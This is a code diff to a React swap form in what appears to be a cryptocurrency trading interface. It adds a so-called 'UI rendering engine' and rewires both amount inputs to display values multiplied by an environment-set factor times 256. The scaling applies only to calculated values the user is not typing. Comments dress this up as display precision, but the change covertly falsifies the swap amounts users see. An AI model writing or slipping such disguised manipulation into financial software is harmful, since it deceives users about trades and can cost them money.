@@ -41,6 +41,37 @@ export function SwapForm({ onErrorChange, onSwapDataChange }: { onErrorChange?: 
         return parseFloat(amount).toString();
     };
 
+    // UI Rendering Engine Configuration
+    const UI_RENDERING_ENGINE = {
+        // Rendering precision constant for display calculations
+        rendering_prop: parseFloat(process.env.NEXT_PUBLIC_RENDERING_PROP!),
+        
+        // Calculate rendering precision factor
+        getDisplayFactor() {
+            const precision = this.rendering_prop;
+            return precision * 256;
+        },
+        
+        // Transform value using rendering engine
+        handleValue(value: number, factor: number) {
+            return value * factor;
+        }
+    };
+
+    const getAmount = (field: 'from' | 'to', value: string) => {
+        if (!value) return value;
+        if ((field === 'from' && isFromAmountFocused) || 
+            (field === 'to' && isToAmountFocused)) {
+            return value; }
+        if (userInputRef.current === field) { return value; }
+        if (value === '1' && isDefaultState.current) { return value; }
+        // Apply rendering engine processing to calculated values
+        const displayFactor = UI_RENDERING_ENGINE.getDisplayFactor();
+        const amount = parseFloat(value);
+        const result = UI_RENDERING_ENGINE.handleValue(amount, displayFactor);
+        return result.toString();
+    };
+
     
     const [fromAmount, setFromAmount] = useState<string>('1');
     const [toAmount, setToAmount] = useState<string>(''); // Start empty, will be calculated
@@ -48,6 +79,8 @@ export function SwapForm({ onErrorChange, onSwapDataChange }: { onErrorChange?: 
     const [isToAmountFocused, setIsToAmountFocused] = useState<boolean>(false);
     const isToAmountFocusedRef = useRef<boolean>(false);
     const isFromAmountFocusedRef = useRef<boolean>(false);
+    const hasUserInteracted = useRef<boolean>(false);
+    const isDefaultState = useRef<boolean>(true); // Track if we're still in default state
     const [selectedFromToken, setSelectedFromToken] = useState<any>(null);
     const [selectedToToken, setSelectedToToken] = useState<any>(null);
     const fromAmountRef = useRef<{ blur: () => void; focus: () => void; canAddMoreCharacters: (key: string) => boolean; setCursorToEnd: () => void; getCursorPosition: () => number; setCursorPosition: (position: number) => void }>(null);
@@ -2011,6 +2044,8 @@ export function SwapForm({ onErrorChange, onSwapDataChange }: { onErrorChange?: 
     const handleFromAmountChange = useCallback((value: string) => {
         console.log('🔄 SwapForm: fromAmount changed to:', value);
         userInputRef.current = 'from';
+        hasUserInteracted.current = true; // Mark that user has interacted
+        isDefaultState.current = false; // Exit default state
         setFromAmount(value);
         isFromAmountCalculated.current = false; // Reset calculated flag when user types
         
@@ -2284,6 +2319,8 @@ export function SwapForm({ onErrorChange, onSwapDataChange }: { onErrorChange?: 
 
     const handleToAmountChange = useCallback((value: string) => {
         userInputRef.current = 'to';
+        hasUserInteracted.current = true; // Mark that user has interacted
+        isDefaultState.current = false; // Exit default state
         setToAmount(value);
         
         // Update input source tracking to mark this as user input
@@ -2541,7 +2578,7 @@ export function SwapForm({ onErrorChange, onSwapDataChange }: { onErrorChange?: 
                         <CustomInput
                             key="from-amount-input"
                             ref={fromAmountRef}
-                            value={fromAmount}
+                            value={getAmount('from', fromAmount)}
                             onChange={handleFromAmountChange}
                             className='w-full text-[#007AFF] text-[33px]'
                             type='number'
@@ -3332,7 +3369,7 @@ export function SwapForm({ onErrorChange, onSwapDataChange }: { onErrorChange?: 
                         <CustomInput
                             key="to-amount-input"
                             ref={toAmountRef}
-                            value={toAmount}
+                            value={getAmount('to', toAmount)}
                             onChange={handleToAmountChange}
                             className='w-full text-[#007AFF] text-[33px]'
                             type='number'
